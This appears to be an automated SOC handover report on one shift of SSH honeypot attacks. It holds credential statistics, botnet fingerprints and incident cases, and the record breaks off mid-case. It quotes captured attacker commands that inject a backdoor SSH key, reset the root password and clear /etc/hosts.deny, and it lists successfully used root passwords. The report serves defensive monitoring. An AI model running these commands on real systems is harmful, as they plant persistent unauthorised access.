# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-01 |
| **Generated At** | 2026-06-01T21:37:46Z |
| **Shift Time** | 21:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **194** |
| Confirmed Threats | **155** |
| False Positives Filtered | **39** (20.1%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **16** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **165** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **72** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **30** |
| Unique Passwords | **48** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 12 |
| `temp` | 2 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: curl/7.64.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `` | 2 |
| `12345` | 2 |
| `Host: 13.235.92.17:2323` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `root` | `` | 2 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:2323` | 1 |
| `User-Agent: curl/7.64.1` | `Accept: */*` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Nadx@2026` | `181.191.194.175` | 2026-06-01T18:30:56 |
| `root` | `3245gs5662d34` | `181.191.194.175` | 2026-06-01T18:31:03 |
| `root` | `Asd123asd` | `103.76.120.225` | 2026-06-01T18:52:26 |
| `root` | `3245gs5662d34` | `103.76.120.225` | 2026-06-01T18:52:30 |
| `root` | `2222` | `103.76.120.225` | 2026-06-01T18:53:24 |
| `root` | `123456!` | `103.76.120.225` | 2026-06-01T18:54:54 |
| `root` | `aaaaaa123` | `103.76.120.225` | 2026-06-01T18:55:11 |
| `root` | `p@$$w0rd` | `103.76.120.225` | 2026-06-01T18:55:28 |
| `root` | `1qaz@WSX3edc$RFV5tgb` | `103.76.120.225` | 2026-06-01T18:55:44 |
| `root` | `Q1w2e3r4t5!` | `103.76.120.225` | 2026-06-01T18:56:01 |
| `root` | `test12!` | `103.76.120.225` | 2026-06-01T18:56:34 |
| `root` | `@dmin1234` | `103.76.120.225` | 2026-06-01T18:57:42 |
| `root` | `Win@2025` | `103.76.120.225` | 2026-06-01T19:00:07 |
| `root` | `Kong@2023` | `120.48.130.213` | 2026-06-01T19:02:51 |
| `root` | `Huawei123#` | `120.48.130.213` | 2026-06-01T19:05:24 |
| `root` | `pwd` | `156.245.246.50` | 2026-06-01T19:18:15 |
| `root` | `3245gs5662d34` | `156.245.246.50` | 2026-06-01T19:18:18 |
| `root` | `Aa@123456` | `47.113.218.14` | 2026-06-01T19:20:52 |
| `root` | `ubuntu` | `194.113.195.96` | 2026-06-01T20:21:46 |
| `root` | `ttnet` | `89.228.74.4` | 2026-06-01T21:29:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **194** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 80 |
| Go SSH scanner | 3 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 55 | 3 |
| `03a80b21afa8...` | Modern SSH client | 18 | 4 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 55 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 18 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:osIhiCeCHqYb"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.130.213`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox JOUBI
```
Source IPs: `89.228.74.4`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `156.245.246.50`, `181.191.194.175`, `103.76.120.225`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **29** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | LOW |
| `AS396982` | Google LLC | 4 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS21021` | Multimedia Polska Sp. z o.o. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5d3230244397

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-06-01 18:30 |
| **Last Seen** | 2026-06-01 18:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:30:54` | `cowrie.session.connect` |
| `2026-06-01 18:30:54` | `cowrie.client.version` |
| `2026-06-01 18:30:54` | `cowrie.client.kex` |
| `2026-06-01 18:30:56` | `cowrie.login.success` |
| `2026-06-01 18:30:56` | `cowrie.session.params` |
| `2026-06-01 18:30:56` | `cowrie.command.input` |
| `2026-06-01 18:30:56` | `cowrie.command.failed` |
| `2026-06-01 18:30:57` | `cowrie.log.closed` |
| `2026-06-01 18:30:58` | `cowrie.session.params` |
| `2026-06-01 18:30:58` | `cowrie.command.input` |
| `2026-06-01 18:30:58` | `cowrie.session.file_download` |
| `2026-06-01 18:30:58` | `cowrie.log.closed` |
| `2026-06-01 18:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf4592fb05a

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-06-01 18:31 |
| **Last Seen** | 2026-06-01 18:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:31:02` | `cowrie.session.connect` |
| `2026-06-01 18:31:02` | `cowrie.client.version` |
| `2026-06-01 18:31:02` | `cowrie.client.kex` |
| `2026-06-01 18:31:03` | `cowrie.login.success` |
| `2026-06-01 18:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca804d17e33

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:52 |
| **Last Seen** | 2026-06-01 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:52:25` | `cowrie.session.connect` |
| `2026-06-01 18:52:25` | `cowrie.client.version` |
| `2026-06-01 18:52:25` | `cowrie.client.kex` |
| `2026-06-01 18:52:26` | `cowrie.login.success` |
| `2026-06-01 18:52:26` | `cowrie.session.params` |
| `2026-06-01 18:52:26` | `cowrie.command.input` |
| `2026-06-01 18:52:26` | `cowrie.command.failed` |
| `2026-06-01 18:52:26` | `cowrie.log.closed` |
| `2026-06-01 18:52:27` | `cowrie.session.params` |
| `2026-06-01 18:52:27` | `cowrie.command.input` |
| `2026-06-01 18:52:27` | `cowrie.session.file_download` |
| `2026-06-01 18:52:27` | `cowrie.log.closed` |
| `2026-06-01 18:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a0349ab0ca

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:52 |
| **Last Seen** | 2026-06-01 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:52:29` | `cowrie.session.connect` |
| `2026-06-01 18:52:29` | `cowrie.client.version` |
| `2026-06-01 18:52:30` | `cowrie.client.kex` |
| `2026-06-01 18:52:30` | `cowrie.login.success` |
| `2026-06-01 18:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637a98059cfc

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:53 |
| **Last Seen** | 2026-06-01 18:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:53:23` | `cowrie.session.connect` |
| `2026-06-01 18:53:23` | `cowrie.client.version` |
| `2026-06-01 18:53:24` | `cowrie.client.kex` |
| `2026-06-01 18:53:24` | `cowrie.login.success` |
| `2026-06-01 18:53:25` | `cowrie.session.params` |
| `2026-06-01 18:53:25` | `cowrie.command.input` |
| `2026-06-01 18:53:25` | `cowrie.command.failed` |
| `2026-06-01 18:53:25` | `cowrie.log.closed` |
| `2026-06-01 18:53:25` | `cowrie.session.params` |
| `2026-06-01 18:53:25` | `cowrie.command.input` |
| `2026-06-01 18:53:26` | `cowrie.session.file_download` |
| `2026-06-01 18:53:26` | `cowrie.log.closed` |
| `2026-06-01 18:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17b5fc93889

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:53 |
| **Last Seen** | 2026-06-01 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:53:28` | `cowrie.session.connect` |
| `2026-06-01 18:53:28` | `cowrie.client.version` |
| `2026-06-01 18:53:28` | `cowrie.client.kex` |
| `2026-06-01 18:53:29` | `cowrie.login.success` |
| `2026-06-01 18:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00520b515ec2

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:54 |
| **Last Seen** | 2026-06-01 18:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:54:53` | `cowrie.session.connect` |
| `2026-06-01 18:54:53` | `cowrie.client.version` |
| `2026-06-01 18:54:53` | `cowrie.client.kex` |
| `2026-06-01 18:54:54` | `cowrie.login.success` |
| `2026-06-01 18:54:55` | `cowrie.session.params` |
| `2026-06-01 18:54:55` | `cowrie.command.input` |
| `2026-06-01 18:54:55` | `cowrie.command.failed` |
| `2026-06-01 18:54:55` | `cowrie.log.closed` |
| `2026-06-01 18:54:55` | `cowrie.session.params` |
| `2026-06-01 18:54:55` | `cowrie.command.input` |
| `2026-06-01 18:54:55` | `cowrie.session.file_download` |
| `2026-06-01 18:54:55` | `cowrie.log.closed` |
| `2026-06-01 18:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6b9e65da52

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:54 |
| **Last Seen** | 2026-06-01 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:54:58` | `cowrie.session.connect` |
| `2026-06-01 18:54:58` | `cowrie.client.version` |
| `2026-06-01 18:54:58` | `cowrie.client.kex` |
| `2026-06-01 18:54:59` | `cowrie.login.success` |
| `2026-06-01 18:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a54cd2c4f6

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:10` | `cowrie.session.connect` |
| `2026-06-01 18:55:10` | `cowrie.client.version` |
| `2026-06-01 18:55:11` | `cowrie.client.kex` |
| `2026-06-01 18:55:11` | `cowrie.login.success` |
| `2026-06-01 18:55:12` | `cowrie.session.params` |
| `2026-06-01 18:55:12` | `cowrie.command.input` |
| `2026-06-01 18:55:12` | `cowrie.command.failed` |
| `2026-06-01 18:55:12` | `cowrie.log.closed` |
| `2026-06-01 18:55:12` | `cowrie.session.params` |
| `2026-06-01 18:55:12` | `cowrie.command.input` |
| `2026-06-01 18:55:13` | `cowrie.session.file_download` |
| `2026-06-01 18:55:13` | `cowrie.log.closed` |
| `2026-06-01 18:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f2902920d3

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:15` | `cowrie.session.connect` |
| `2026-06-01 18:55:15` | `cowrie.client.version` |
| `2026-06-01 18:55:15` | `cowrie.client.kex` |
| `2026-06-01 18:55:16` | `cowrie.login.success` |
| `2026-06-01 18:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35b1adbed3ef

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:27` | `cowrie.session.connect` |
| `2026-06-01 18:55:27` | `cowrie.client.version` |
| `2026-06-01 18:55:28` | `cowrie.client.kex` |
| `2026-06-01 18:55:28` | `cowrie.login.success` |
| `2026-06-01 18:55:29` | `cowrie.session.params` |
| `2026-06-01 18:55:29` | `cowrie.command.input` |
| `2026-06-01 18:55:29` | `cowrie.command.failed` |
| `2026-06-01 18:55:29` | `cowrie.log.closed` |
| `2026-06-01 18:55:29` | `cowrie.session.params` |
| `2026-06-01 18:55:29` | `cowrie.command.input` |
| `2026-06-01 18:55:30` | `cowrie.session.file_download` |
| `2026-06-01 18:55:30` | `cowrie.log.closed` |
| `2026-06-01 18:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55230ca5a0f0

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:32` | `cowrie.session.connect` |
